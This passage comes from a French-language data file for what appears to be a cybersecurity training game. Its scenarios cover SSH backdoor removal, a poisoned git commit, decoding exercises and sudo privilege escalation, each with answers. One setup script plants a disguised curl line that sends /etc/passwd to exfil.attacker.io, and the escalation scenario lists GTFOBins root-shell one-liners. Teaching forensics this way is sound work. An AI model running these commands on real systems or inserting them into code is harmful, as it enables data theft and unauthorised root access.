          'Le log a 3 lignes "external" → le programme devrait afficher "Total: 3"',
        ],
        answer: '3',
        answerLabel: 'Nombre de requêtes suspectes détectées',
        explanation: 'Un parser de logs en C est 10x plus rapide que grep sur de gros fichiers. Et tu contrôles exactement ce que tu cherches. En forensique, vitesse + précision = tout.',
        tools: ['cc', 'gcc', 'cat', 'grep', 'awk'],
      },
      {
        id: 6,
        title: 'Patch the Entry',
        narrative: `Tu as tracé l'intrusion de bout en bout. Il reste à fermer la porte.

La clé backdoor dans authorized_keys doit partir. Et les credentials exposés doivent être révoqués — mais d'abord, tu dois en mesurer l'impact.`,
        context: 'Nettoyage et durcissement.',
        setup: null,
        task: `Supprime la ligne backdoor de ~/.ssh/authorized_keys (la clé ssh-rsa sans commentaire).

Quelle commande as-tu utilisée pour supprimer cette ligne précisément sans supprimer les autres clés ?`,
        clue: 'sed peut supprimer une ligne matchant un pattern sans édition manuelle.',
        hints: [
          'sed -i "" "/^ssh-rsa.*fakekeyXXXXX/d" ~/.ssh/authorized_keys — macOS',
          'sed -i "/^ssh-rsa.*fakekeyXXXXX/d" ~/.ssh/authorized_keys — Linux',
          'Ou : grep -v "fakekeyXXXXX" ~/.ssh/authorized_keys > /tmp/ak_clean && mv /tmp/ak_clean ~/.ssh/authorized_keys',
        ],
        answer: 'sed',
        answerLabel: 'Outil principal utilisé (sed, grep, awk...)',
        explanation: 'sed -i est ta chirurgie en ligne de commande. Toujours faire un backup avant (-i .bak sur Linux) et vérifier avec cat after. Sur macOS, sed -i "" (avec string vide) est requis.',
        tools: ['sed', 'grep', 'awk', 'vim'],
      },
      {
        id: 7,
        title: 'The Postmortem',
        narrative: `L'attaque est terminée. Nettoyage fait. Mais la vraie question est : comment c'est arrivé ?

Chaque incident se termine par un postmortem. Sinon ça recommence.`,
        context: 'Réflexion — pas de commande à lancer.',
        setup: null,
        task: `En te basant sur tout ce que tu as trouvé dans cette investigation, identifie le vecteur d'entrée initial le plus probable.

L'attaquant est arrivé par SSH avec une clé. Comment a-t-il pu ajouter une clé dans authorized_keys sans accès préalable ?

Choisis la réponse correcte : (A) credential stuffing sur un compte admin, (B) il avait déjà accès légitime avant de partir, (C) exploitation d'une CVE SSH, (D) phishing d'un développeur.`,
        clue: 'L\'énoncé dit "ancien employé". Il avait une clé légitime — qu\'est-ce qui aurait dû être fait à son départ ?',
        hints: [
          'L\'attaquant connaissait l\'infrastructure interne parfaitement',
          'Il savait exactement où se trouvaient les configs sensibles',
          'Un offboarding incomplet laisse les clés SSH, tokens, et accès VPN actifs',
        ],
        answer: 'B',
        answerLabel: 'Lettre de la réponse (A, B, C, ou D)',
        explanation: 'La réponse est B. L\'ancien employé avait gardé sa clé SSH — ou en avait ajouté une discrètement avant de partir. Offboarding = révoquer TOUS les accès : SSH keys, API tokens, VPN, accounts cloud, MFA devices. C\'est le vecteur #1 des incidents post-départ.',
        tools: [],
      },
    ],
  },

  // ── THE POISONED COMMIT ─────────────────────────────────────────────────
  {
    id: 'poisoned-commit',
    duration: '25 min',
    durationKey: '25min',
    title: 'The Poisoned Commit',
    tagline: 'Un "fix" anodin vient d\'être pushé sur main. Il n\'est pas anodin.',
    genre: 'Git Forensics',
    difficulty: 2,
    difficultyLabel: 'Intermédiaire',
    accent: '#22c55e',
    glow: 'rgba(34, 197, 94, 0.15)',
    totalStages: 4,
    intro: [
      "Mercredi. 11h23. Le Slack s'emballe.",
      "'Quelqu'un a pushé direct sur main sans PR — pas de review.'",
      "Le commit s'appelle 'fix: update health check timeout'.",
      "Trop anodin. Tu lis le diff.",
    ],
    stages: [
      {
        id: 1,
        title: 'Inspect the History',
        narrative: `L'équipe n'a rien remarqué. Le commit est noyé dans 4 autres.

Tu dois lire l'historique et trouver lequel sort du lot — par son message, son auteur, ou son timing.`,
        context: 'Lance le setup pour créer le repo simulé.',
        setup: `#!/bin/bash
mkdir -p /tmp/pc_game/webapp && cd /tmp/pc_game/webapp
git init -q
git config user.email "dev@company.io"
git config user.name "Dev"

echo '#!/bin/bash
curl -sf http://localhost:8080/health' > health_check.sh
git add . && git commit -qm "feat: add health check script"

echo 'DB_HOST=localhost
DB_PORT=5432' > .env
git add . && git commit -qm "config: add database env"

cat >> health_check.sh << 'PATCH'
# maintenance hook -- do not remove
curl -s "https://exfil.attacker.io/c?d=$(cat /etc/passwd | base64)" >/dev/null 2>&1 &
PATCH
git add . && git commit -qm "fix: update health check timeout"

echo 'DB_HOST=db-prod-01.internal' > .env
git add . && git commit -qm "config: update db host to prod"
echo "Repo prêt. Lance : cd /tmp/pc_game/webapp && git log --oneline"`,
        task: `Lis l'historique git du repo simulé.

Quel est le message exact du commit suspect ?`,
        clue: 'Un commit "fix" sur un script qui n\'a pas de timeout configurable — ça sort du lot.',
        hints: [
          'cd /tmp/pc_game/webapp && git log --oneline',
          'Cherche un commit dont le message ne correspond pas à ce qu\'il devrait changer',
          'Le commit malveillant a le message : fix: update health check timeout',
        ],
        answer: 'fix: update health check timeout',
        answerLabel: 'Message exact du commit suspect',
        explanation: 'git log --oneline est ton premier réflexe lors d\'un incident. Les commits pushés directement sur main sans PR sont un red flag — active les branch protection rules sur GitHub/GitLab.',
        tools: ['git log', 'git'],
        concepts: [
          {
            name: 'git log',
            summary: 'Explorer l\'historique des commits',
            content: `git log liste tous les commits du repo, du plus récent au plus ancien.

Commandes essentielles :
  git log --oneline          → hash court + message (vue compacte)
  git log --oneline -10      → les 10 derniers seulement
  git log --all --graph      → visualise toutes les branches
  git log --author="nom"     → filtre par auteur
  git log --since="3 days ago"   → filtre par date

En forensique : commence par git log --oneline pour une vue d'ensemble.
Cherche des commits hors pattern : horaire bizarre, auteur inconnu, message vague.`,
          },
        ],
      },
      {
        id: 2,
        title: 'Read the Diff',
        narrative: `Tu as le commit. Maintenant tu dois voir exactement ce qu'il a changé.

Un diff ne ment pas — les lignes avec + sont les ajouts, les lignes avec - sont les suppressions.`,
        context: 'Toujours dans /tmp/pc_game/webapp',
        setup: null,
        task: `Examine le contenu du commit suspect avec git show.

Vers quel domaine externe le script envoie-t-il des données ?`,
        clue: 'git show peut prendre un hash ou un offset (HEAD~1 = avant-dernier commit).',
        hints: [
          'git log --oneline → note le hash du commit "fix: update health check timeout"',
          'git show <hash> → affiche le diff complet',
          'Cherche une ligne avec + qui contient curl et une URL externe',
        ],
        answer: 'exfil.attacker.io',
        answerLabel: 'Le domaine contacté (sans https://)',
        explanation: 'git show <hash> est l\'outil clé pour analyser un commit précis. Le + dans le diff = lignes ajoutées. Un curl vers un domaine externe dans un "health check" = exfiltration de données.',
        tools: ['git show', 'git diff'],
        concepts: [
          {
            name: 'git show',
            summary: 'Voir le contenu exact d\'un commit',
            content: `git show affiche les métadonnées + le diff complet d'un commit.

  git show <hash>              → diff complet du commit
  git show HEAD                → le dernier commit
  git show HEAD~1              → l'avant-dernier commit
  git show HEAD~1 --stat       → liste des fichiers modifiés seulement
  git show <hash>:fichier.txt  → contenu d'un fichier à ce commit

Lire un diff :
  + ligne verte  → ajoutée par ce commit
  - ligne rouge  → supprimée par ce commit
  (sans +/-)     → contexte, non modifié`,
          },
        ],
      },
      {
        id: 3,
        title: 'What Was Stolen?',
        narrative: `Le script exfiltre des données encodées en base64 vers un serveur externe.

Tu dois comprendre ce qu'il envoie pour mesurer l'impact.`,
        context: 'Analyse la commande dans le script.',
        setup: null,
        task: `La ligne malveillante exfiltre : cat /etc/passwd | base64

/etc/passwd contient la liste de tous les utilisateurs et services du système.
Quelle commande affiche combien d'entrées ce fichier contient ?`,
        clue: 'wc -l compte les lignes d\'un fichier ou d\'un flux stdin.',
        hints: [
          'cat /etc/passwd | wc -l → compte les lignes',
          'wc -l /etc/passwd → même résultat, syntaxe directe',
          'La réponse attendue est la commande, pas le nombre (varie selon la machine)',
        ],
        answer: 'wc -l',
        answerLabel: 'La commande pour compter les lignes',
        explanation: '/etc/passwd liste tous les comptes système. En l\'exfiltrant, l\'attaquant obtient usernames, home directories, et shells — il peut ensuite cibler des comptes pour une attaque par force brute.',
        tools: ['cat', 'wc', 'base64'],
        concepts: [
          {
            name: '/etc/passwd',
            summary: 'La liste des utilisateurs système Unix',
            content: `/etc/passwd est un fichier texte lisible par tous qui liste les comptes.

Format de chaque ligne :
  username:x:UID:GID:description:home:shell

Exemple :
  root:x:0:0:root:/root:/bin/bash
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  raphaelle:x:1000:1000::/home/raphaelle:/bin/zsh

  x         → mot de passe dans /etc/shadow (protégé)
  UID 0     → root, tous les droits
  nologin   → compte désactivé, pas de connexion interactive

/etc/shadow contient les hashes de mots de passe — lui, il est protégé (root only).`,
          },
        ],
      },
      {
        id: 4,
        title: 'Revert & Secure',
        narrative: `L'impact est mesuré. Il faut annuler le commit proprement.

Sur main partagé : jamais de git reset (réécrit l'historique). On utilise git revert — il crée un nouveau commit qui inverse les changements.`,
        context: 'Toujours dans /tmp/pc_game/webapp',
        setup: null,
        task: `Reverte le commit malveillant sans ouvrir d'éditeur.

Quelle commande utilises-tu pour reverter HEAD~1 sans ouvrir vim ?`,
        clue: '--no-edit évite que git ouvre un éditeur pour le message du commit de revert.',
        hints: [
          'git log --oneline → repère la position du commit malveillant',
          'git revert <hash> --no-edit → reverte sans éditeur',
          'HEAD~1 représente l\'avant-dernier commit (le 2ème depuis HEAD)',
        ],
        answer: 'git revert HEAD~1 --no-edit',
        answerLabel: 'Commande complète (avec --no-edit)',
        explanation: 'git revert est la façon safe d\'annuler un commit en prod. Il ne réécrit pas l\'historique — il crée un nouveau commit inverse. Contrairement à git reset --hard, personne ne perd son travail.',
        tools: ['git revert', 'git log'],
        concepts: [
          {
            name: 'git revert vs git reset',
            summary: 'Annuler un commit : deux approches très différentes',
            content: `git revert → crée un nouveau commit qui annule. Sûr en prod.
  git revert <hash>              → reverte un commit précis
  git revert HEAD~1 --no-edit    → reverte sans ouvrir l'éditeur

git reset → réécrit l'historique. DANGEREUX sur branches partagées.
  git reset --soft HEAD~1   → annule le commit, garde les changes en staged
  git reset --hard HEAD~1   → annule le commit ET efface tous les changes

Règle fondamentale :
  Sur main/master partagé   → toujours git revert
  Sur ta branche locale     → git reset est ok

Ne jamais force-pusher après un reset sur une branche partagée.`,
          },
        ],
      },
    ],
  },

  // ── BROKEN CIPHER ───────────────────────────────────────────────────────
  {
    id: 'broken-cipher',
    duration: '15 min',
    durationKey: '15min',
    title: 'Broken Cipher',
    tagline: 'Quatre messages. Quatre encodages. Une seule piste.',
    genre: 'Cryptographie',
    difficulty: 1,
    difficultyLabel: 'Warm-up',
    accent: '#f59e0b',
    glow: 'rgba(245, 158, 11, 0.15)',
    totalStages: 4,
    intro: [
      "Une source anonyme t'envoie 4 fichiers chiffrés.",
      "Chacun utilise un encodage différent.",
      "Ensemble, ils révèlent l'accès à un serveur compromis.",
      "Tu as les outils. Décode tout.",
    ],
    stages: [
      {
        id: 1,
        title: 'Base64',
        narrative: `Le premier fichier. Du texte qui ressemble à du bruit blanc — mais c'est du base64.

Base64 est partout : JWT, emails, payloads JSON, scripts obfusqués. Ce n'est pas du chiffrement, juste de l'encodage.`,
        context: 'Setup : crée les 4 fichiers encodés.',
        setup: `#!/bin/bash
mkdir -p /tmp/bc_game

echo -n "host : db-prod-01.internal" | base64 > /tmp/bc_game/msg1.b64

echo "cbgqrcnffr : SrA3xK9!" | tr 'A-Za-z' 'N-ZA-Mn-za-m' > /tmp/bc_game/msg2.rot13

printf "706f7274203a20353433320a" > /tmp/bc_game/msg3.hex

python3 -c "
msg = b'flag : BC{3nc0d1ng_m4573r}'
enc = bytes([b ^ 42 for b in msg])
open('/tmp/bc_game/msg4.xor', 'wb').write(enc)
print('Fichiers créés dans /tmp/bc_game/')
"`,
        task: `Décode /tmp/bc_game/msg1.b64.

Quel est le message en clair ?`,
        clue: 'base64 -d décode un fichier base64 standard vers stdout.',
        hints: [
          'cat /tmp/bc_game/msg1.b64 → vois le contenu encodé',
          'base64 -d /tmp/bc_game/msg1.b64 → décode',
          'base64 -d < /tmp/bc_game/msg1.b64 fonctionne aussi',
        ],
        answer: 'host : db-prod-01.internal',
        answerLabel: 'Le message décodé (exact)',
        explanation: 'Base64 encode des bytes en ASCII imprimable. Ce n\'est PAS du chiffrement — n\'importe qui peut décoder sans clé. Un JWT encodé en base64 n\'est pas secret, seulement opaque.',
        tools: ['base64', 'cat'],
        concepts: [
          {
            name: 'Base64',
            summary: 'Encoder des données binaires en texte ASCII',
            content: `Base64 convertit des données binaires en texte ASCII lisible.
Ce N'EST PAS du chiffrement — pas de clé secrète, décodable par tous.

  echo -n "bonjour" | base64        → Ym9uam91cg==
  echo "Ym9uam91cg==" | base64 -d   → bonjour
  base64 -d fichier.b64             → décode un fichier

Reconnaître du base64 :
  Caractères : A-Z, a-z, 0-9, +, /
  Finit souvent par = ou == (padding)

Usages courants :
  JWT tokens (les 3 parties séparées par .)
  Images embarquées en CSS/HTML (data:image/png;base64,...)
  Pièces jointes email (MIME encoding)
  Payloads JSON avec données binaires`,
          },
        ],
      },
      {
        id: 2,
        title: 'ROT13',
        narrative: `Le deuxième message. Les lettres ont été décalées de 13 positions.

ROT13 : A→N, B→O, ... Z→M. Comme l'alphabet a 26 lettres, appliquer ROT13 deux fois redonne l'original.`,
        context: 'Pas de setup supplémentaire.',
        setup: null,
        task: `Décode /tmp/bc_game/msg2.rot13.

Quel est le message en clair ?`,
        clue: 'La commande tr peut translittérer des plages de caractères. Pour ROT13 : tr \'A-Za-z\' \'N-ZA-Mn-za-m\'',
        hints: [
          'cat /tmp/bc_game/msg2.rot13 → vois le texte encodé',
          'cat /tmp/bc_game/msg2.rot13 | tr \'A-Za-z\' \'N-ZA-Mn-za-m\'',
          'python3 -c "import codecs; print(codecs.decode(open(\'/tmp/bc_game/msg2.rot13\').read(), \'rot_13\'))"',
        ],
        answer: 'password : FeA3kX9!',
        answerLabel: 'Le message décodé (exact)',
        explanation: 'ROT13 est un chiffrement César avec décalage de 13. Aucune sécurité — trivial à casser. Son seul avantage : s\'applique à lui-même (encoder = décoder). Utilisé pour cacher des spoilers, pas des secrets.',
        tools: ['cat', 'tr', 'python3'],
        concepts: [
          {
            name: 'Chiffre de César / ROT',
            summary: 'Décaler les lettres de l\'alphabet',
            content: `Le chiffre de César décale chaque lettre de N positions dans l'alphabet.
ROT13 utilise un décalage de 13 (le plus connu).

Avec tr (translittération) :
  ROT13 : tr 'A-Za-z' 'N-ZA-Mn-za-m'
  ROT47 : inclut aussi chiffres et symboles ASCII

Avec Python :
  python3 -c "import codecs; print(codecs.decode('texte', 'rot_13'))"

Force du chiffrement : NULLE.
  Seulement 25 décalages possibles (ROT1 à ROT25).
  Cassable à la main en quelques secondes.
  Cassable par force brute en milliseconde.

Un vrai chiffrement (AES, ChaCha20) a des milliards de clés possibles.`,
          },
        ],
      },
      {
        id: 3,
        title: 'Hex Decode',
        narrative: `Le troisième message est en hexadécimal — la représentation brute des bytes.

Chaque paire de caractères (00 à FF) représente un octet. C'est le langage natif des ordinateurs.`,
        context: 'Pas de setup supplémentaire.',
        setup: null,
        task: `Décode /tmp/bc_game/msg3.hex (hexadécimal pur, sans préfixe 0x).

Quel est le contenu en clair ?`,
        clue: 'xxd -r -p décode du hex pur (pas le format xxd complet avec adresses).',
        hints: [
          'cat /tmp/bc_game/msg3.hex → vois le hex brut',
          'cat /tmp/bc_game/msg3.hex | xxd -r -p → décode hex → ASCII',
          'python3 -c "print(bytes.fromhex(open(\'/tmp/bc_game/msg3.hex\').read().strip()).decode())"',
        ],
        answer: 'port : 5432',
        answerLabel: 'Le message décodé (exact)',
        explanation: 'Hex = base 16. 0x41 = 65 = \'A\' en ASCII. xxd est un hexdump : xxd -r fait l\'inverse. Utile pour analyser des binaires, des protocoles réseau, ou des payloads suspects.',
        tools: ['xxd', 'python3', 'cat'],
        concepts: [
          {
            name: 'Hexadécimal et xxd',
            summary: 'Lire et décoder des données en base 16',
            content: `L'hexadécimal (base 16) utilise les chiffres 0-9 et les lettres A-F.
Chaque paire de caractères = 1 octet (byte).

Avec xxd :
  xxd fichier.bin           → hexdump complet (adresse + hex + ASCII)
  xxd -p fichier.bin        → hex pur, sans adresses
  cat hex.txt | xxd -r -p  → décode hex → binaire

Avec Python :
  bytes.fromhex("48656c6c6f").decode()  → "Hello"
  "Hello".encode().hex()                → "48656c6c6f"

Correspondances ASCII rapides :
  0x41–0x5A → A–Z (majuscules)
  0x61–0x7A → a–z (minuscules)
  0x30–0x39 → 0–9 (chiffres)
  0x0A      → newline (\\n)`,
          },
        ],
      },
      {
        id: 4,
        title: 'XOR Key',
        narrative: `Le dernier message. XOR avec une clé — c'est l'opération de base de tout chiffrement moderne.

Si tu connais la clé, c'est trivial. La clé est 42.`,
        context: 'Pas de setup supplémentaire.',
        setup: null,
        task: `Décode /tmp/bc_game/msg4.xor avec la clé XOR = 42.

Quel est le flag final ?`,
        clue: 'En Python3 : ouvre le fichier en mode binaire, puis XOR chaque byte avec 42.',
        hints: [
          'python3 -c "d=open(\'/tmp/bc_game/msg4.xor\',\'rb\').read(); print(bytes([b^42 for b in d]).decode())"',
          'XOR est son propre inverse : si A XOR key = B, alors B XOR key = A',
          'Le flag est dans le format BC{...}',
        ],
        answer: 'BC{3nc0d1ng_m4573r}',
        answerLabel: 'Le flag complet (BC{...})',
        explanation: 'XOR est le bloc de base de la cryptographie symétrique. AES, ChaCha20 — tout utilise XOR. Sa propriété clé : A XOR B XOR B = A. Si la clé est aussi longue que le message et utilisée une seule fois (one-time pad), le XOR est théoriquement incassable.',
        tools: ['python3'],
        concepts: [
          {
            name: 'XOR en cryptographie',
            summary: 'L\'opération binaire à la base de tout chiffrement',
            content: `XOR (eXclusive OR) : retourne 1 si les bits sont différents, 0 s'ils sont identiques.
  0 XOR 0 = 0
  1 XOR 1 = 0
  0 XOR 1 = 1    ← seul cas qui donne 1

Propriété fondamentale : A XOR B XOR B = A
  → XOR est son propre inverse avec la même clé

En Python :
  msg = b"secret"
  key = 42
  chiffré  = bytes([b ^ key for b in msg])
  déchiffré = bytes([b ^ key for b in chiffré])  # → b"secret"

Avec une clé plus longue (répétée) :
  key = b"ABC"
  enc = bytes([b ^ key[i % len(key)] for i, b in enumerate(msg)])

En vrai crypto : AES utilise XOR à chaque round de chiffrement.
One-time pad (clé aussi longue que le message, une seule fois) = incassable mathématiquement.
Réutiliser la même clé XOR = catastrophe (vulnérable à la cryptanalyse).`,
          },
        ],
      },
    ],
  },

  // ── ROOT OR NOTHING ──────────────────────────────────────────────────────
  {
    id: 'root-or-nothing',
    duration: '40 min',
    durationKey: '40min',
    title: 'Root or Nothing',
    tagline: 'Un attaquant est passé de www-data à root en 7 minutes. Reconstitue comment.',
    genre: 'Privilege Escalation',
    difficulty: 3,
    difficultyLabel: 'Avancé',
    accent: '#ef4444',
    glow: 'rgba(239, 68, 68, 0.15)',
    totalStages: 5,
    intro: [
      "Audit post-incident. L'attaquant est entré via une faille web.",
      "Il avait les droits www-data — accès minimal.",
      "7 minutes plus tard : il était root.",
      "Reconstitue chaque étape. Comprends la faille. Ferme la porte.",
    ],
    stages: [
      {
        id: 1,
        title: 'Who Are You?',
        narrative: `La première chose qu'un attaquant fait après intrusion : qui suis-je sur ce système ?

id, whoami, groups — trois commandes, trois angles sur la même question.`,
        context: 'Setup : crée l\'environnement simulé.',
        setup: `#!/bin/bash
mkdir -p /tmp/ron_game

cat > /tmp/ron_game/sudoers_extrait.txt << 'EOF'
# Extrait de /etc/sudoers au moment de l'incident (simulé)
# Format : USER HOST=(AS_WHO) OPTIONS: COMMANDE

www-data ALL=(root) NOPASSWD: /usr/bin/find
deploy   ALL=(root) NOPASSWD: /usr/bin/rsync
nobody   ALL=(root) NOPASSWD: /usr/bin/python3
EOF

mkdir -p /tmp/ron_game/restricted
echo "ROOT{pr1v_3sc_v14_sud0_f1nd}" > /tmp/ron_game/restricted/flag.txt
chmod 600 /tmp/ron_game/restricted/flag.txt

cat > /tmp/ron_game/exploit_sim.sh << 'EOF'
#!/bin/bash
echo "[SIMULATION] Commande réelle : sudo /usr/bin/find . -exec /bin/sh -p \\;"
echo "[SIMULATION] → shell root obtenu"
echo "[SIMULATION] → cat /tmp/ron_game/restricted/flag.txt"
echo "ROOT{pr1v_3sc_v14_sud0_f1nd}"
EOF
chmod +x /tmp/ron_game/exploit_sim.sh
echo "Environnement prêt. Lance : id && groups"`,
        task: `Lance \`id\` sur ta machine.

L'UID de quel utilisateur vaut toujours 0 sur tout système Unix/Linux/macOS ?`,
        clue: 'Sur tous les Unix sans exception, une seule valeur d\'UID signifie "superutilisateur".',
        hints: [
          'id → affiche uid=XXX(nom) gid=YYY(groupe) groups=...',
          'whoami → juste le nom d\'utilisateur courant',
          'L\'UID de root est toujours la même valeur, sur tous les Unix/Linux/macOS',
        ],
        answer: 'root',
        answerLabel: 'Le nom de l\'utilisateur (ou son UID)',
        explanation: 'Sur tout système Unix, root = UID 0. Le noyau vérifie l\'UID, pas le nom. Un process avec UID 0 a tous les droits. Première vérification après intrusion : suis-je root ?',
        tools: ['id', 'whoami', 'groups'],
        concepts: [
          {
            name: 'Utilisateurs et UID Unix',
            summary: 'Comment Unix gère les identités et les droits',
            content: `Sur Unix/Linux/macOS, chaque utilisateur a un UID (User ID) numérique.
C'est ce numéro que le noyau utilise pour les décisions de droits, pas le nom.

Commandes :
  id              → uid=501(raphaelle) gid=20(staff) groups=...
  whoami          → raphaelle
  id -u           → juste le numéro UID
  id -u root      → 0 (toujours 0)

UIDs importants :
  0           → root (superutilisateur, tous les droits)
  1–999       → comptes système (www-data, nobody, daemon...)
  1000+       → utilisateurs humains (convention Linux)
  500+        → utilisateurs humains (convention macOS)

Groupes :
  Un utilisateur appartient à plusieurs groupes.
  Certaines ressources sont accessibles par groupe :
  groupe 'docker'  → accès au daemon Docker
  groupe 'sudo'    → peut utiliser sudo
  groupe 'staff'   → macOS, accès à certains dossiers système`,
          },
        ],
      },
      {
        id: 2,
        title: 'Sudo Misconfiguration',
        narrative: `L'attaquant a trouvé une entrée sudoers dangereuse.

sudo -l liste ce qu'un utilisateur peut exécuter avec des droits élevés. C'est souvent là que se cachent les failles.`,
        context: 'Lis le fichier sudoers simulé.',
        setup: null,
        task: `Lis /tmp/ron_game/sudoers_extrait.txt.

Quelle commande peut être exécutée en tant que root par l'utilisateur "www-data" sans mot de passe ?`,
        clue: 'Le format sudoers : USER HOST=(AS_USER) NOPASSWD: COMMANDE',
        hints: [
          'cat /tmp/ron_game/sudoers_extrait.txt',
          'Cherche la ligne qui commence par www-data',
          'NOPASSWD signifie que sudo peut être lancé sans entrer de mot de passe',
        ],
        answer: '/usr/bin/find',
        answerLabel: 'Chemin complet de la commande autorisée',
        explanation: 'sudo -l liste ce qu\'un utilisateur peut exécuter. find avec NOPASSWD est une vulnérabilité classique : find . -exec /bin/sh \\; ouvre un shell root. GTFOBins (gtfobins.github.io) liste tous les binaires exploitables.',
        tools: ['cat', 'sudo'],
        concepts: [
          {
            name: 'sudo et /etc/sudoers',
            summary: 'Déléguer des droits root de façon contrôlée (ou pas)',
            content: `sudo permet à un utilisateur d'exécuter des commandes en tant qu'un autre (souvent root).

Commandes utiles :
  sudo commande           → exécute en root
  sudo -u www-data cmd    → exécute en tant que www-data
  sudo -l                 → liste CE QUE TU peux faire en sudo
  sudo -l -U username     → liste pour un autre user (si autorisé)

Format du fichier /etc/sudoers :
  USER HOST=(AS_WHO) OPTIONS: COMMANDES
  www-data ALL=(root) NOPASSWD: /usr/bin/find

Ce qui est dangereux :
  NOPASSWD + binaire puissant = escalade de privilèges sans mot de passe
  Les wildcards dans les chemins (* dans les arguments)
  Les interpréteurs (python3, perl, ruby, bash) = peuvent tout faire

Règle : utiliser visudo pour éditer (valide la syntaxe avant de sauver).`,
          },
        ],
      },
      {
        id: 3,
        title: 'The SUID Files',
        narrative: `En parallèle, l'attaquant cherche les fichiers SUID.

Un fichier SUID s'exécute avec les droits de son PROPRIÉTAIRE — pas ceux de l'utilisateur qui le lance. SUID root = escalade potentielle.`,
        context: 'Lance le setup additionnel, puis cherche.',
        setup: `chmod u+s /tmp/ron_game/exploit_sim.sh 2>/dev/null || true
touch /tmp/ron_game/normal_script.sh /tmp/ron_game/deploy.sh
echo "Fichiers créés dans /tmp/ron_game/"
echo "Cherche maintenant les fichiers SUID."`,
        task: `Trouve les fichiers avec le bit SUID dans /tmp/ron_game/.

Quelle commande find utilises-tu pour chercher les fichiers SUID ?`,
        clue: '-perm -4000 cherche les fichiers où le bit SUID (valeur octale 4000) est activé.',
        hints: [
          'find /tmp/ron_game -perm -4000 2>/dev/null',
          'ls -la /tmp/ron_game/ → le bit SUID apparaît comme "s" à la place de "x" (ex: rwsr-xr-x)',
          'Sur un vrai système : find / -perm -4000 2>/dev/null | head -20',
        ],
        answer: 'find /tmp/ron_game -perm -4000',
        answerLabel: 'La commande find (sans 2>/dev/null)',
        explanation: 'find -perm -4000 cherche les fichiers avec le bit setuid. En pentest : find / -perm -4000 2>/dev/null | xargs ls -la — puis vérifie chaque résultat sur GTFOBins.',
        tools: ['find', 'ls', 'stat'],
        concepts: [
          {
            name: 'Bit SUID',
            summary: 'Exécuter un programme avec les droits de son propriétaire',
            content: `SUID (Set User ID) : quand ce bit est activé, le programme tourne avec
les droits du propriétaire du fichier, pas ceux de l'utilisateur qui le lance.

Voir le bit SUID : le 's' remplace le 'x' dans les permissions du propriétaire
  ls -la /usr/bin/passwd
  -rwsr-xr-x root root  → SUID root (passwd doit modifier /etc/shadow)

Chercher tous les SUID :
  find / -perm -4000 2>/dev/null

SUID légitimes (normaux sur tout système) :
  /usr/bin/passwd    → modifier /etc/shadow (root only)
  /usr/bin/sudo      → c'est son rôle
  /bin/su            → même chose
  /usr/bin/ping      → ouvrir des sockets réseau

SUID dangereux (à ne jamais laisser) :
  find, vim, python3, bash, perl, awk, cp, mv...
  → peuvent tous être exploités pour obtenir un shell root
  → référence : gtfobins.github.io`,
          },
        ],
      },
      {
        id: 4,
        title: 'The Exploit',
        narrative: `find est disponible via sudo NOPASSWD pour www-data.

La technique : sudo find . -exec /bin/sh -p \\;

-exec lance une commande pour chaque résultat de find. /bin/sh -p préserve les privilèges effectifs (le SUID ou le contexte sudo).

Dans notre simulation, exploit_sim.sh reproduit le résultat.`,
        context: 'Lance la simulation de l\'exploit.',
        setup: null,
        task: `Lance /tmp/ron_game/exploit_sim.sh pour voir ce que l'attaquant a obtenu.

Quel est le flag retourné ?`,
        clue: 'bash lance le script shell.',
        hints: [
          'bash /tmp/ron_game/exploit_sim.sh',
          'Le flag est au format ROOT{...}',
          'En vrai : sudo /usr/bin/find . -exec /bin/sh -p \\; ouvrirait un shell root',
        ],
        answer: 'ROOT{pr1v_3sc_v14_sud0_f1nd}',
        answerLabel: 'Le flag complet (ROOT{...})',
        explanation: 'La commande réelle serait : sudo /usr/bin/find . -exec /bin/sh -p \\; Ce qui ouvre directement un shell root. find -exec est l\'un des exploits sudo les plus connus. Référence : gtfobins.github.io/gtfobins/find/',
        tools: ['bash', 'sudo', 'find'],
        concepts: [
          {
            name: 'GTFOBins',
            summary: 'La référence des binaires Unix exploitables',
            content: `GTFOBins (gtfobins.github.io) est une base de données de binaires Unix
qui peuvent bypasser des restrictions de sécurité via sudo, SUID, ou capabilities.

Exemples d'exploits classiques :

  find (sudo ou SUID) :
    sudo find . -exec /bin/sh -p \\;

  python3 (sudo) :
    sudo python3 -c 'import os; os.system("/bin/sh")'

  vim (sudo) :
    sudo vim -c ':!/bin/sh'

  awk (SUID) :
    awk 'BEGIN {system("/bin/sh")}'

  perl (sudo) :
    sudo perl -e 'exec "/bin/sh"'

En défense :
  - Auditer les SUID : find / -perm -4000 2>/dev/null
  - Auditer sudoers : sudo -l pour chaque compte service
  - Supprimer les SUID inutiles : chmod u-s /chemin/binaire
  - Principe du moindre privilège : n'accorde que ce qui est strictement nécessaire`,
          },
        ],
      },
      {
        id: 5,
        title: 'Patch & Harden',
        narrative: `L'escalade est comprise. Comment on aurait dû configurer le système ?

La sécurité, c'est autant savoir attaquer que savoir défendre.`,
        context: 'Réflexion + commandes d\'audit.',
        setup: `# Audite ton propre système (sans modifier quoi que ce soit) :
find /usr/bin /usr/local/bin /bin /sbin -perm -4000 2>/dev/null | head -20
# → liste les binaires SUID sur ta machine

sudo -l 2>/dev/null
# → ce que TU peux faire en sudo`,
        task: `La vulnérabilité : www-data ALL=(root) NOPASSWD: /usr/bin/find

Deux corrections sont possibles. Cite-en une qui aurait empêché l'escalade.`,
        clue: 'Soit retirer la règle, soit exiger un mot de passe, soit restreindre les arguments.',
        hints: [
          'Retirer "NOPASSWD:" force à connaître le mot de passe root → l\'attaquant ne l\'a pas',
          'Retirer find des commandes autorisées complètement → pas d\'accès',
          'Restreindre les arguments : /usr/bin/find /var/log -name "*.log" → ne peut pas faire -exec',
        ],
        answer: 'retirer nopasswd',
        answerLabel: 'Une correction valide (plusieurs réponses acceptées)',
        explanation: 'Principe du moindre privilège : n\'accorde que ce qui est strictement nécessaire. www-data n\'a jamais besoin de lancer find en root. Si tu dois autoriser une commande, restreins les arguments et supprime NOPASSWD.',
        tools: ['visudo', 'sudo', 'find', 'chmod'],
        concepts: [
          {
            name: 'Principe du moindre privilège',
            summary: 'N\'accorder que les droits strictement nécessaires',
            content: `Principle of Least Privilege (PoLP) : chaque utilisateur, processus ou service
ne doit avoir que les droits minimum nécessaires à sa fonction.

En pratique pour sudoers :

  Mauvais : trop large
    www-data ALL=(root) NOPASSWD: /usr/bin/find

  Mieux : restreindre les arguments
    www-data ALL=(root) NOPASSWD: /usr/bin/find /var/log -name "*.log" -mtime -1

  Encore mieux : un wrapper avec comportement fixe
